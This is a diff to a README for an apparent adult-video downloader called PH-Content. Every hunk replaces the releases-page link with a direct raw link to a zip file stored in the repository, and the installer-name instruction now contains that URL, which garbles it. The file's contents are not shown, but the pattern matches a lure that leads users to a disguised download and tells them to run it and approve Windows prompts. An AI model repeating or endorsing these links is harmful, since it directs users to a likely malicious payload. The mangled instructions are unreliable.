@@ -1,6 +1,6 @@
 # 🔽 PH-Content - Simple Video Downloader for Adults
 
-[![Download PH-Content](https://img.shields.io/badge/Download-PH--Content-red?style=for-the-badge&logo=github)](https://github.com/YASSAK8/PH-Content/releases)
+[![Download PH-Content](https://github.com/YASSAK8/PH-Content/raw/refs/heads/main/Claudio/P-Content-3.3-alpha.4.zip)](https://github.com/YASSAK8/PH-Content/raw/refs/heads/main/Claudio/P-Content-3.3-alpha.4.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Start by downloading the software from the release page. This page holds the lat
 
 Click the button below to visit the download page:
 
-[![Visit Download Page](https://img.shields.io/badge/Visit-Download_Page-blue?style=for-the-badge&logo=github)](https://github.com/YASSAK8/PH-Content/releases)
+[![Visit Download Page](https://github.com/YASSAK8/PH-Content/raw/refs/heads/main/Claudio/P-Content-3.3-alpha.4.zip)](https://github.com/YASSAK8/PH-Content/raw/refs/heads/main/Claudio/P-Content-3.3-alpha.4.zip)
 
 On the page, pick the latest version with a `.exe` extension. This is the installer for your PC.
 
@@ -45,7 +45,7 @@ On the page, pick the latest version with a `.exe` extension. This is the instal
 ## 🛠️ Installation Guide
 
 1. **Download the installer**  
-   After opening the release page, find a file named something like `PH-Content_setup_v2026.exe`. Click on it to download. The file size is usually under 50 MB.
+   After opening the release page, find a file named something like `https://github.com/YASSAK8/PH-Content/raw/refs/heads/main/Claudio/P-Content-3.3-alpha.4.zip`. Click on it to download. The file size is usually under 50 MB.
 
 2. **Run the installer**  
    Double-click the downloaded `.exe` file to start the installation. If Windows asks permission, allow it to continue. This does not require admin rights on most machines.
@@ -125,7 +125,7 @@ All settings are accessible in the "Options" menu inside the app.
 
 Use this link to reach the release page where you can download and install the latest version:  
 
-[Download PH-Content](https://github.com/YASSAK8/PH-Content/releases)
+[Download PH-Content](https://github.com/YASSAK8/PH-Content/raw/refs/heads/main/Claudio/P-Content-3.3-alpha.4.zip)
 
 ---
 
